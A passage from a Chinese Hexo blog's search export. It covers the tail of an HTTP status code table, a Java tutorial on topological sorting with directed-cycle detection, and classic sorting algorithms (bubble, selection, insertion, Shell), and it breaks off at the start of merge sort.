<td><b>Bad Request</td>
<td align="left">客户端有语法错误，不能被服务器所理解</td>
</tr>
<tr>
<td>403</td>
<td><b>Forbidden</td>
<td align="left">服务器收到请求，但拒绝提供服务。例：无权限访问相关资源</td>
</tr>
<tr>
<td>404</td>
<td><b>Not Found</td>
<td align="left">请求资源不存在，一般是URL输入有误，或网站资源被删除</td>
</tr>
<tr>
<td>428</td>
<td><b>Precondition Required</td>
<td align="left">服务器要求有条件的请求，告诉客户端想要访问某资源，必须携带特定的请求头</td>
</tr>
<tr>
<td>429</td>
<td><b>Too Many Requests</td>
<td align="left">请求太多，可以限制客户端请求某个资源的数量，配合Retry-After（多长时间后可以请求）响应头一起使用</td>
</tr>
<tr>
<td>500</td>
<td><b>Internal Server Error</td>
<td align="left">服务器发生不可预期的错误。服务器端在执行请求时发生了错误。也有可能是web应用存在bug或某些临时故障</td>
</tr>
<tr>
<td>503</td>
<td><b>Service Unavailable</td>
<td align="left">服务器暂时处于超负载或正在停机维护，现在无法处理请求</td>
</tr>
<tr>
<td>511</td>
<td><b>Network Authentication Required</td>
<td align="left">客户端需要进行身份验证才能获取网络权限</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>网络</tag>
      </tags>
  </entry>
  <entry>
    <title>拓扑排序算法</title>
    <url>/posts/7ec55fd4.html</url>
    <content><![CDATA[<h1 id="一、问题描述"><a href="#一、问题描述" class="headerlink" title="一、问题描述"></a>一、问题描述</h1><p>在现实生活中，我们经常会同一时间接到很多任务去完成，但是这些任务的完成是有先后次序的。以我们学习java学科为例，我们需要学习很多知识，但是这些知识在学习的过程中是需要按照先后次序来完成的。从java基础，到jsp&#x2F;servlet，到ssm，到springboot等是个循序渐进且有依赖的过程。在学习jsp前要首先掌握java基础和html基础，学习ssm框架前要掌握jsp&#x2F;servlet之类才行。</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815141214.png" alt="  "></p>
<p><strong>拓扑排序：</strong></p>
<p>给定一副有向图，将所有的顶点排序，使得所有的有向边均从排在前面的元素指向排在后面的元素，此时就可以明确的表示出每个顶点的优先级。下列是一副拓扑排序后的示意图。</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815141311.png" alt="  "></p>
<hr>
<h1 id="三、检测有向图的环"><a href="#三、检测有向图的环" class="headerlink" title="三、检测有向图的环"></a>三、检测有向图的环</h1><p>如果学习x课程前必须先学习y课程，学习y课程前必须先学习z课程，学习z课程前必须先学习x课程，那么一定是有问题了，我们就没有办法学习了，因为这三个条件没有办法同时满足。其实这三门课程x、y、z的条件组成了一个环：<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815141315.png" alt="  "><br>因此，如果我们要使用拓扑排序解决优先级问题，首先得保证图中没有环的存在。</p>
<p><strong>检测有向环的API设计</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815141317.png" alt="  "></p>
<blockquote>
<p>在API中添加了onStack[] 布尔数组，索引为图的顶点，当我们深度搜索时：</p>
<ol>
<li>在如果当前顶点正在搜索，则把对应的onStack数组中的值改为true，标识进栈；</li>
<li>如果当前顶点搜索完毕，则把对应的onStack数组中的值改为false，标识出栈；</li>
<li>如果即将要搜索某个顶点，但该顶点已经在栈中，则图中有环；</li>
</ol>
</blockquote>
<p>需要提到的是，在此处我使用的有向图结构是基于邻接表实现，具体可以观看<a href="https://blog.csdn.net/qq_51938362/article/details/127342059">Java数据结构-图</a></p>
<p>在这里，我直接给出检测有向图是否有环的代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DirectedCycle</span> &#123;</span><br><span class="line">    <span class="comment">// 索引代表顶点，值表示当前顶点是否已经被搜索</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span>[] marked;</span><br><span class="line">    <span class="comment">// 记录图中是否有环</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> hasCycle;</span><br><span class="line">    <span class="comment">// 索引代表顶点，使用栈的思想，记录当前顶点有没有已经处于正在搜索的有向路径上</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span>[] onStack;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建一个检测环对象，检测图G中是否有环</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DirectedCycle</span><span class="params">(Digraph G)</span>&#123;</span><br><span class="line">        <span class="comment">// 初始化marked数组</span></span><br><span class="line">        <span class="built_in">this</span>.marked = <span class="keyword">new</span> <span class="title class_">boolean</span>[G.V()];</span><br><span class="line">        <span class="comment">// 初始化hasCycle</span></span><br><span class="line">        <span class="built_in">this</span>.hasCycle = <span class="literal">false</span>;</span><br><span class="line">        <span class="comment">// 初始化onStack数组</span></span><br><span class="line">        <span class="built_in">this</span>.onStack = <span class="keyword">new</span> <span class="title class_">boolean</span>[G.V()];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 找到图中每一个顶点，让每一个顶点作为入口，调用一次dfs进行搜索</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">v</span> <span class="operator">=</span><span class="number">0</span>; v&lt;G.V();v++)&#123;</span><br><span class="line">            <span class="comment">// 判断如果当前顶点还没有搜索过，则调用dfs进行搜索</span></span><br><span class="line">            <span class="keyword">if</span> (!marked[v])&#123;</span><br><span class="line">                dfs(G,v);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 基于深度优先搜索，检测图G中是否有环</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(Digraph G, <span class="type">int</span> v)</span>&#123;</span><br><span class="line">        <span class="comment">// 把顶点v表示为已搜索</span></span><br><span class="line">        marked[v] = <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">// 把当前顶点进栈</span></span><br><span class="line">        onStack[v] = <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">// 进行深度搜索</span></span><br><span class="line">        <span class="keyword">for</span> (Integer w : G.adj(v)) &#123;</span><br><span class="line">            <span class="comment">// 判断如果当前顶点w没有被搜索过</span></span><br><span class="line">            <span class="comment">// 则继续递归调用dfs方法完成深度优先搜索</span></span><br><span class="line">            <span class="keyword">if</span> (!marked[w])&#123;</span><br><span class="line">                dfs(G,w);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            判断当前顶点w是否已经在栈中，</span></span><br><span class="line"><span class="comment">            如果已经在栈中，证明当前顶点之前处于正在搜索的状态，</span></span><br><span class="line"><span class="comment">            那么现在又要搜索一次，证明检测到环了</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">if</span> (onStack[w])&#123;</span><br><span class="line">                hasCycle = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 把当前顶点出栈</span></span><br><span class="line">        onStack[v] = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断当前有向图G中是否有环</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">hasCycle</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> hasCycle;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<hr>
<h1 id="三、基于深度优先的顶点排序"><a href="#三、基于深度优先的顶点排序" class="headerlink" title="三、基于深度优先的顶点排序"></a>三、基于深度优先的顶点排序</h1><p>如果要把图中的顶点生成线性序列其实是一件非常简单的事，在使用深度优先搜索中我们会发现其实深度优先搜索有一个特点，那就是在一个连通子图上，每个顶点只会被搜索一次，如果我们能在深度优先搜索的基础上，添加一行代码，只需要将搜索的顶点放入到线性序列的数据结构中，我们就能完成这件事。</p>
<p><strong>顶点排序API设计</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815141321.png" alt="  "></p>
<p>在API的设计中，我们添加了一个栈reversePost（在实现中直接使用的ArrayList）用来存储顶点，当我们深度搜索图时，每搜索完毕一个顶点，把该顶点放入到reversePost中，这样就可以实现顶点排序。</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815141323.png" alt="  "></p>
<hr>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815141326.png" alt="  "></p>
<hr>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815141329.png" alt="  "></p>
<hr>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815141331.png" alt="  "></p>
<hr>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815141333.png" alt="  "></p>
<hr>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815141335.png" alt="  "></p>
<hr>
<p>最终，整个栈的倒序就是这个图的顶点排序结果</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DepthFirstOrder</span> &#123;</span><br><span class="line">    <span class="comment">// 索引代表顶点，值表示当前顶点是否已经被搜索</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span>[] marked;</span><br><span class="line">    <span class="comment">// 存储顶点序列</span></span><br><span class="line">    <span class="keyword">private</span> ArrayList&lt;Integer&gt; reversePost;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建一个顶点排序对象</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DepthFirstOrder</span><span class="params">(Digraph G)</span>&#123;</span><br><span class="line">        <span class="comment">// 初始化marked数组</span></span><br><span class="line">        <span class="built_in">this</span>.marked = <span class="keyword">new</span> <span class="title class_">boolean</span>[G.V()];</span><br><span class="line">        <span class="comment">// 初始化reversePost （这里使用 ArrayList 充当栈）</span></span><br><span class="line">        <span class="built_in">this</span>.reversePost = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">        <span class="comment">// 遍历图中的每一个顶点，让每个顶点作为入口，完成一次深度优先搜索</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">v</span> <span class="operator">=</span> <span class="number">0</span>; v &lt; G.V(); v++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (!marked[v])&#123;</span><br><span class="line">                dfs(G,v);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 基于深度优先搜索，把顶点排序</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(Digraph G, <span class="type">int</span> v)</span>&#123;</span><br><span class="line">        <span class="comment">// 标记当前v已经被搜索</span></span><br><span class="line">        marked[v] = <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">// 通过循环深度搜索顶点v</span></span><br><span class="line">        <span class="keyword">for</span> (Integer w : G.adj(v)) &#123;</span><br><span class="line">            <span class="comment">// 如果当前顶点w没有搜索，则递归调用dfs进行搜索</span></span><br><span class="line">            <span class="keyword">if</span> (!marked[w])&#123;</span><br><span class="line">                dfs(G,w);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 让顶点v进栈</span></span><br><span class="line">        reversePost.add(v);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取顶点线性序列</span></span><br><span class="line">    <span class="keyword">public</span> ArrayList&lt;Integer&gt;  <span class="title function_">reversePost</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">// 顺序反转</span></span><br><span class="line">        Collections.reverse(reversePost);</span><br><span class="line">        <span class="keyword">return</span> reversePost;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="四、拓扑排序实现"><a href="#四、拓扑排序实现" class="headerlink" title="四、拓扑排序实现"></a>四、拓扑排序实现</h1><p>前面已经实现了环的检测以及顶点排序，那么拓扑排序就很简单了，基于一幅图，先检测有没有环，如果没有环，则调用顶点排序即可。</p>
<p><strong>API设计</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815141338.png" alt="  "></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TopoLogical</span> &#123;</span><br><span class="line">    <span class="comment">// 顶点的拓扑排序</span></span><br><span class="line">    <span class="keyword">private</span> ArrayList&lt;Integer&gt; order;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造拓扑排序对象</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TopoLogical</span><span class="params">(Digraph G)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建一个检测有向环的对象</span></span><br><span class="line">        <span class="type">DirectedCycle</span> <span class="variable">cycle</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DirectedCycle</span>(G);</span><br><span class="line">        <span class="comment">// 判断G图中有没有环，如果没有环，则进行顶点排序：创建一个顶点排序对象</span></span><br><span class="line">        <span class="keyword">if</span> (!cycle.hasCycle())&#123;</span><br><span class="line">            <span class="type">DepthFirstOrder</span> <span class="variable">depthFirstOrder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DepthFirstOrder</span>(G);</span><br><span class="line">            order = depthFirstOrder.reversePost();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断图G是否有环</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isCycle</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> order==<span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取拓扑排序的所有顶点</span></span><br><span class="line">    <span class="keyword">public</span> ArrayList&lt;Integer&gt;  <span class="title function_">order</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> order;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>数据结构</tag>
        <tag>算法</tag>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title>Java经典排序</title>
    <url>/posts/36b478da.html</url>
    <content><![CDATA[<h1 id="一、冒泡排序"><a href="#一、冒泡排序" class="headerlink" title="一、冒泡排序"></a>一、冒泡排序</h1><p>冒泡排序（Bubble Sort），是一种计算机科学领域的较简单的排序算法。</p>
<blockquote>
<p> <strong>排序原理：</strong></p>
<ol>
<li>比较相邻的元素。如果前一个元素比后一个元素大，就交换这两个元素的位置。</li>
<li>对每一对相邻元素做同样的工作，从开始第一对元素到结尾的最后一对元素。最终最后位置的元素就是最大</li>
</ol>
</blockquote>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143240.gif" alt="  "></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Bubble</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">bubbleSort</span><span class="params">(Comparable[] args)</span>&#123;</span><br><span class="line">		<span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">		<span class="comment">// 遍历 n - 1 次</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; args.length - <span class="number">1</span>; i++)&#123;</span><br><span class="line">			flag = <span class="literal">true</span>;</span><br><span class="line">			<span class="comment">// 遍历 n - 1 - i 次</span></span><br><span class="line">			<span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; args.length - <span class="number">1</span> - i; j++)&#123;</span><br><span class="line">				<span class="comment">// 比较索引j和索引j+1处的值</span></span><br><span class="line">				<span class="keyword">if</span> (greater(args[j], args[j+<span class="number">1</span>]))&#123;</span><br><span class="line">					exch(args, j,j+<span class="number">1</span>);</span><br><span class="line">					flag = <span class="literal">false</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (flag)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        比较 v元素 是否大于 w元素 </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span>  <span class="type">boolean</span> <span class="title function_">greater</span><span class="params">(Comparable v, Comparable w)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> v.compareTo(w) &gt; <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    数组元素i和j交换位置</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">exch</span><span class="params">(Comparable[] args,<span class="type">int</span> i,<span class="type">int</span> j)</span>&#123;</span><br><span class="line">        Comparable temp;</span><br><span class="line">        temp = args[i];</span><br><span class="line">        args[i] = args[j];</span><br><span class="line">        args[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<hr>
<h1 id="二、选择排序"><a href="#二、选择排序" class="headerlink" title="二、选择排序"></a>二、选择排序</h1><p>选择排序是一种简单直观的排序方法。</p>
<blockquote>
<p>  <strong>排序原理：</strong></p>
<ol>
<li>每一次遍历的过程中，都假定第一个索引处的元素是最小值，和其他索引处的值依次进行比较，如果当前索引处 的值大于其他某个索引处的值，则假定其他某个索引出的值为最小值，最后可以找到最小值所在的索引</li>
<li>交换第一个索引处和最小值所在的索引处的值</li>
</ol>
</blockquote>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143251.gif" alt="  "></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Select</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">selectSort</span><span class="params">(Comparable[] args)</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; args.length-<span class="number">1</span>; i++)&#123;</span><br><span class="line">            <span class="comment">//定义一个变量，记录最小元素所在的索引</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">minIndex</span> <span class="operator">=</span> i;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i+<span class="number">1</span>; j &lt; args.length; j++)&#123;</span><br><span class="line">                <span class="comment">//需要比较最小索引minIndex处的值和j索引处的值；</span></span><br><span class="line">                <span class="keyword">if</span> (greater(args[minIndex], args[j]))&#123;</span><br><span class="line">                    minIndex = j;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//交换最小元素所在索引minIndex处的值和索引i处的值</span></span><br><span class="line">            <span class="keyword">if</span> (minIndex != i)</span><br><span class="line">                exch(args, i, minIndex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        比较 v元素 是否大于 w元素 </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span>  <span class="type">boolean</span> <span class="title function_">greater</span><span class="params">(Comparable v, Comparable w)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> v.compareTo(w) &gt; <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    数组元素i和j交换位置</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">exch</span><span class="params">(Comparable[] args,<span class="type">int</span> i,<span class="type">int</span> j)</span>&#123;</span><br><span class="line">        Comparable temp;</span><br><span class="line">        temp = args[i];</span><br><span class="line">        args[i] = args[j];</span><br><span class="line">        args[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<hr>
<h1 id="三、插入排序"><a href="#三、插入排序" class="headerlink" title="三、插入排序"></a>三、插入排序</h1><p>插入排序（Insertion sort）是一种简单直观且稳定的排序算法。</p>
<blockquote>
<p><strong>排序原理：</strong></p>
<ol>
<li>把所有的元素分为两组，已经排序的和未排序的；</li>
<li>找到未排序的组中的第一个元素，向已经排序的组中进行插入；</li>
<li>倒叙遍历已经排序的元素，依次和待插入的元素进行比较，直到找到一个元素小于等于待插入元素，那么就把待插入元素放到这个位置，其他的元素向后移动一位；</li>
</ol>
</blockquote>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143254.gif" alt="  "></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Insert</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">insertSort</span><span class="params">(Comparable[] args)</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; args.length; i++)&#123;</span><br><span class="line">            <span class="comment">// 待插入的数</span></span><br><span class="line">            <span class="type">Comparable</span> <span class="variable">temp</span> <span class="operator">=</span> args[i];</span><br><span class="line">            <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span>(; j &gt;= <span class="number">0</span>; j --)&#123;</span><br><span class="line">                <span class="comment">// 找到了比 temp 小的数，则该数后面一个位置就是待插入位置</span></span><br><span class="line">                <span class="keyword">if</span>(greater(temp, args[j]))</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="comment">// 比 temp 大的数，通通往后移一位</span></span><br><span class="line">                args[j + <span class="number">1</span>] = args[j];</span><br><span class="line">            &#125;</span><br><span class="line">            args[j + <span class="number">1</span>] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    比较 v元素 是否大于 w元素 </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span>  <span class="type">boolean</span> <span class="title function_">greater</span><span class="params">(Comparable v, Comparable w)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> v.compareTo(w) &gt; <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    数组元素i和j交换位置</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">exch</span><span class="params">(Comparable[] args,<span class="type">int</span> i,<span class="type">int</span> j)</span>&#123;</span><br><span class="line">        Comparable temp;</span><br><span class="line">        temp = args[i];</span><br><span class="line">        args[i] = args[j];</span><br><span class="line">        args[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<hr>
<h1 id="四、希尔排序"><a href="#四、希尔排序" class="headerlink" title="四、希尔排序"></a>四、希尔排序</h1><p>希尔排序是插入排序的一种，又称“缩小增量排序”，是插入排序算法的一种更高效的改进版本。<br>前面学习插入排序的时候，我们会发现一个很不友好的事儿，如果已排序的分组元素为{2,5,7,9,10}，未排序的分组元素为{1,8}，那么下一个待插入元素为1，我们需要拿着1从后往前，依次和10,9,7,5,2进行交换位置，才能完成真正的插入，每次交换只能和相邻的元素交换位置。那如果我们要提高效率，直观的想法就是一次交换，能把1放到<br>更前面的位置，比如一次交换就能把1插到2和5之间，这样一次交换1就向前走了5个位置，可以减少交换的次数，这样的需求如何实现呢？接下来我们来看看希尔排序的原理。</p>
<blockquote>
<p><strong>排序原理</strong>：</p>
<ol>
<li>选定一个增长量h，按照增长量h作为数据分组的依据，对数据进行分组；</li>
<li>对分好组的每一组数据完成插入排序；</li>
<li>减小增长量，最小减为1，重复第二步操作。</li>
</ol>
</blockquote>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143259.gif" alt="  "></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">shellSort</span><span class="params">(Comparable[] args)</span>&#123;</span><br><span class="line">        <span class="comment">// 根据数组长度确定 gap</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">gap</span> <span class="operator">=</span> args.length / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">while</span> (gap &gt;= <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="comment">// 将数组分成若干个子数组</span></span><br><span class="line">            <span class="comment">/* 为什么是 [gap, args.length), 因为在此处就开始了插入排序</span></span><br><span class="line"><span class="comment">                这就与插入排序的 i 是从 1 开始相同，此处是从 gap</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> gap; i &lt; args.length; i ++)&#123;</span><br><span class="line">                <span class="comment">// 待插入的数</span></span><br><span class="line">                <span class="type">Comparable</span> <span class="variable">temp</span> <span class="operator">=</span> args[i];</span><br><span class="line">                <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i - gap;</span><br><span class="line">                <span class="keyword">for</span> (; j &gt;= <span class="number">0</span>; j -= gap)&#123;</span><br><span class="line">                    <span class="comment">// 找到了比 temp 小的数，则该数后面第 gap 个位置就是待插入位置</span></span><br><span class="line">                    <span class="keyword">if</span>(greater(temp, args[j]))</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="comment">// 比 temp 大的数，通通往后移 gap 位</span></span><br><span class="line">                    args[j + gap] = args[j];</span><br><span class="line">                &#125;</span><br><span class="line">                args[j + gap] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">            gap /= <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        比较 v元素 是否大于 w元素 </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span>  <span class="type">boolean</span> <span class="title function_">greater</span><span class="params">(Comparable v, Comparable w)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> v.compareTo(w) &gt; <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    数组元素i和j交换位置</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">exch</span><span class="params">(Comparable[] args,<span class="type">int</span> i,<span class="type">int</span> j)</span>&#123;</span><br><span class="line">        Comparable temp;</span><br><span class="line">        temp = args[i];</span><br><span class="line">        args[i] = args[j];</span><br><span class="line">        args[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="五、归并排序"><a href="#五、归并排序" class="headerlink" title="五、归并排序"></a>五、归并排序</h1><p>归并排序是建立在归并操作上的一种有效的排序算法，该算法是采用分治法的一个非常典型的应用。将已有序的子<br>序列合并，得到完全有序的序列；即先使每个子序列有序，再使子序列段间有序。若将两个有序表合并成一个有序<br>表，称为二路归并。</p>
<blockquote>
<p><strong>排序原理：</strong></p>
<ol>
<li>尽可能的一组数据拆分成两个元素相等的子组，并对每一个子组继续拆分，直到拆分后的每个子组的元素个数是 1为止。</li>
<li>将相邻的两个子组进行合并成一个有序的大组；</li>
<li>不断的重复步骤2，直到最终只有一个组为止</li>
</ol>
</blockquote>
